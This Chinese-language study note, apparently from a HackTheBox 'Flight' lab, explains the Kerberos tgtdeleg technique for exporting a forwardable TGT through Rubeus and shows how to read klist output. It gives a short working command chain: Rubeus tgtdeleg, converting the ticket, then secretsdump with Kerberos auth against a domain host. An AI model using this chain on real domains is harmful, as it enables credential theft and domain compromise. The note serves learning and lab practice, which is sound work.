# tgtdeleg

## 介绍

tgtdeleg是一种利用Kerberos"客户端委派(delegation)的能力"从当前登录会话中"合法导出一张可转发TGT"的技术.

本质=让LSASS把"本来就允许被委派的TGT"交出来

## tgtdeleg解决的是什么问题?

正常情况下(Windows Keberos的设计)

(1)用户/机器登录域

(2)LSASS从KDC拿到TGT

(3)TGT存在LSASS

(4)系统访问SMB/LDAP时:

​	LSASS用TGT换TGS

(5)用户态程序拿不到TGT本体

也就是说

你"在用TGT",但你拿不到TGT文件

## tgtdeleg的技术原理(核心)

### 1)关键三个:

​	(1)从当前登录会话已经有TGT

​	(2)该TGT被标记为forwardable

​	(3)Kerberos协议允许"客户端请求委派凭据"

### 2)tgtdeleg实际做了什么?

1)从实现上(以Rubeus为例):

​	(1)调用Windows SSPI/Kerberos API

​	(2)在InitializeSecurityContext设置

​		ISC_REQ_DELEGATE

​	(3)向LSASS表达一个请求:

​	"我要做一次delegation类型的认证"

## LSASS的判断逻辑

1)LSASS会检查:

​	(1)当前安全上下文是否存在TGT

​	(2)TGT是否forwardable

​	(3)当前会话是否允许delegation

2)如果满足

​	(1)LSASS会返回一个包含TGT的Kerberos凭据结构

​	(2)Rebeus把它保存成.kirbi

整个过程不访问KDC/不扫描内存

## tgtdeleg != 域里配置的Delegation

| 你可能想到的                         | 是否相关       |
| ------------------------------------ | -------------- |
| AD 里勾选的 Unconstrained Delegation | ❌              |
| Constrained Delegation               | ❌              |
| RBCD                                 | ❌              |
| Kerberos forwardable TGT             | ✅ **唯一关键** |

(1)tgtdeleg不需要任何AD对象配置

(2)它利用的是Kerberos协议的"客户端委派能力"

## tgtdeleg和其他"拿票方式区别"

| 技术                       | 原理              | 是否触碰 LSASS |
| -------------------------- | ----------------- | -------------- |
| mimikatz sekurlsa::tickets | 读 LSASS 内存     | ✅              |
| Rubeus dump                | 读 LSASS 内存     | ✅              |
| **tgtdeleg**               | Kerberos API 请求 | ❌              |
| Kerberoasting              | 请求 TGS          | ❌              |

tgtdeleg的优势:低权限/低噪音/合法流程

## 拿到TGT之后干什么?

一旦有了.kribi(TGT):

​	(1)Pass-The-Ticket

​	(2)转化成.ccache在linux使用

​	(3)用Kerberos申请TGS

​	(4)SMB/LDAP/RPC/WIMRM

​	(5)secretdump/DCSync(前提是权限足够)

​	(6)S4U攻击链(特定场景)

一句话:tgtdeleg是"Keberos攻击链的起点"

## 什么时候tgtdeleg能成功?

必须条件:

​	(1)当前会话是Kerberos登录

​	(2)已存在TGT

​	(3)TGT标记为forwardable

​	(4)用户不是Protected User

​	(5)未被Credential Guard阻断

常见失败场景

​	(1)NTLM登录

​	(2)TGT不可转发

​	(3)Credential Guard

​	(4)EDR Hook SSPI

​	(5)某些服务型会话(受限)

## 利用

```
.\rubeus.exe tgtdeleg /nowrap
kirbi2ccache ticket.kirbi ticket.ccache 
 export KRB5CCNAME=ticket.ccache 
 secretsdump.py -k -no-pass g0.flight.htb 
```

## 查看

```
c:\1>klist
klist

Current LogonId is 0:0x67e1e7

Cached Tickets: (3)

#0>     Client: G0$ @ FLIGHT.HTB
        Server: krbtgt/FLIGHT.HTB @ FLIGHT.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize 
        Start Time: 1/7/2026 7:00:08 (local)
        End Time:   1/7/2026 17:00:08 (local)
        Renew Time: 1/14/2026 7:00:08 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x2 -> DELEGATION 
        Kdc Called: G0

#1>     Client: G0$ @ FLIGHT.HTB
        Server: krbtgt/FLIGHT.HTB @ FLIGHT.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize 
        Start Time: 1/7/2026 7:00:08 (local)
        End Time:   1/7/2026 17:00:08 (local)
        Renew Time: 1/14/2026 7:00:08 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY 
        Kdc Called: G0

#2>     Client: G0$ @ FLIGHT.HTB
        Server: cifs/g0.flight.htb @ FLIGHT.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize 
        Start Time: 1/7/2026 7:00:08 (local)
        End Time:   1/7/2026 17:00:08 (local)
        Renew Time: 1/14/2026 7:00:08 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0 
        Kdc Called: G0



```

### 1）想判断：这张 TGT 能不能被 tgtdeleg 导出？

看这三类信息：

#### A. **Ticket Flags 里有没有 `forwardable`**

你 #0/#1 都有 `forwardable` ✅
 这代表 **可以委派/可转发**，tgtdeleg 的前提之一。

#### B. **Cache Flags 里有没有 `DELEGATION`（或 PRIMARY）**

- `Cache Flags: 0x2 -> DELEGATION`（#0）✅
   这通常就是 **通过 delegation 相关上下文拿到/缓存的那份票**（你用 tgtdeleg/委派上下文时常见）
- `Cache Flags: 0x1 -> PRIMARY`（#1）✅
   这一般是 **会话的主 TGT**（登录后正常存在）

👉 **tgtdeleg 相关最直观的就是看 #0 这种带 `DELEGATION` 的 TGT。**

#### C. KDC Called 不关键

`Kdc Called: G0` 只是说明向哪台 KDC 请求的票，判断 tgtdeleg 不靠它。

------

### 2）想判断：我能不能用这份票去访问 SMB / 跑 secretsdump？

你得看有没有对应的 **服务票（TGS）**，也就是像你 #2 这种：

### 看 **Server: cifs/g0.flight.htb**（#2）

这张 #2 不是 TGT，是 **给 SMB 用的 TGS**。
 有它的话，你做 SMB 相关的东西（比如 cifs / IPC$ / DCERPC over SMB）通常会更顺。

同时看：

- `Server: cifs/g0.flight.htb @ FLIGHT.HTB` ✅（说明你已经为 SMB 换过票）
- `Ticket Flags ... ok_as_delegate` ✅（表示该服务允许被委派，这对某些委派链路有意义，但对“能不能用 SMB”不是硬条件）
- 也有 `forwardable renewable` ✅（对后续某些链路有帮助）



### 3）你这三张票分别是什么？你该盯哪个？

- **#1（PRIMARY + krbtgt）**：主 TGT（最基础、最重要）
- **#0（DELEGATION + krbtgt）**：委派上下文拿到/缓存的 TGT（和 tgtdeleg 关系最大）
- **#2（cifs/…）**：访问 SMB 的 TGS（和 secretsdump/SMB/RPC 最相关）

------

### 4）你如果只想记一个“最关键判断点”

#### 对 tgtdeleg：

✅ 看 **TGT 的 `forwardable` + `Cache Flags: DELEGATION`**

#### 对 secretsdump（-k）：

✅ 看有没有你要访问的服务票，比如：

- `cifs/<target>`（SMB/RPC 通道常用）
- 之后可能还会看到 `ldap/<dc>`（DRSUAPI/LDAP 相关）